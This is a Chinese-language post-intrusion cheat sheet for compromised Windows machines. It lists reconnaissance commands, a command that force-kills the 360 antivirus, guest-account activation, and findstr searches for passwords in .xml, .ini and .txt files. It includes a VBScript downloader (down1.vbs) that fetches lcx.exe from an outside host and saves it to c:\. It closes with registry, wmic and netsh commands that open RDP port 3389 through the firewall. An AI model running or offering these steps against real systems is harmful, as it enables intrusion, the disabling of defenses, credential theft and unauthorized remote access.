0x01 Windows常用命令自查表

命令 含义
ipconfig /all 获取是否为独立IP地址、DNS、计算机名称等信息。
net user或net1 user 当前用户信息
net localgroup administrators 查看管理员用户组
query user 查看远程终端在线用户
whoami 当前用户权限。
netstat -an 当前端口开放情况。
systeminfo 获取操作系统类型、版本、位数等信息。
systeminfo | findstr /B /C:"OS " 操作系统名称、版本、位数等信息。
tasklist /svc 获取运行的进程名称、服务和PID
tasklist /svc | find "TempService" 获取对应的PID号
netstat -ano | find "3036" 通过PID号查找端口
net start 查看系统开启的服务
net stop/start servicename 停止和开启服务
taskkill /im 360tray.exe /f 强制关闭360杀毒程序

net user guest /active:yes 激活guest用户
hostname 主机名
set 环境变量
route print 查看理由信息
arp -a 查看ARP缓存
netsh firewall show config 查看防火墙规则
netsh firewall show state
DRIVERQUERY 查看已安装驱动程序的列表
net start 查看已启动的Windows服务
sc qc "服务名" 查看服务的启动权限
查看服务列表 wmic service list brief
查看进程列表 wmic process list brief
查看启动程序列表 wmic startup list brief
结束程序 wmic process where name="iexplore.exe" call terminate
dir /b /s *.doc 检测敏感文件
findstr /si password *.xml *.ini *.txt 检测敏感文件

另外down1.vbs和down2.vbs的实现

down1.vbs:

url = "http://wjs001.cn/lcx.exe"    '网络上的文件地址
saveas = "c:\lcx.exe"                '保存成的本地文件

Set xmlhttp = CreateObject("Microsoft.XMLHTTP") '创建HTTP请求对象
Set stream = CreateObject("ADODB.Stream")       '创建ADO数据流对象

Call xmlhttp.open("GET",url,False)'打开连接
Call xmlhttp.send()'发送请求

stream.mode = 3 '设置数据流为读写模式
stream.type = 1     '设置数据流为二进制模式
Call stream.open()'打开数据流
Call stream.write(xmlhttp.responsebody)'将服务器的返回报文主体内容写入数据流
Call stream.savetofile(saveas,2)'将数据流保存为文件

'释放对象
Set xmlhttp = Nothing
Set stream = Nothing

0x05 Windows 开启远程连接

远程连接的默认端口是3389。

1、查看是否开启3389远程连接

1

REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections

0x1表示未开启远程连接，0x0为开启

2、查看本机开启3389远程连接

1

REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber

输出为16进制0xd3d

在 Windows Server2003中,使用cmd命令开启3389端口,示例如下。

1

wmic path win32_terminalservicesetting where (__CLASS  != "") call setallowtsconnections 1

在 Windows Server2008/7/2012中,使用cmd命令开启3389端口,示例如下。

1
2
3
4
5
6

 1 #对应(允许运行任意版本远程桌面的计算机连接)
wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS != "") call setallowtsconnections 1
 2 #对应(仅允许运行使用网络级身份验证的远程桌面的计算机连接(更安全))
 wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName = 'RDP-Tcp') call setuserauthenticationrequired 1
 3 #cmd开启3389
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f

在本地Win7测试时发现如下情况，第一次开启远程桌面需要让远程桌面通过防火墙

cmd执行以下命令修改防火墙配置，允许远程桌面连接通过。

1

netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow
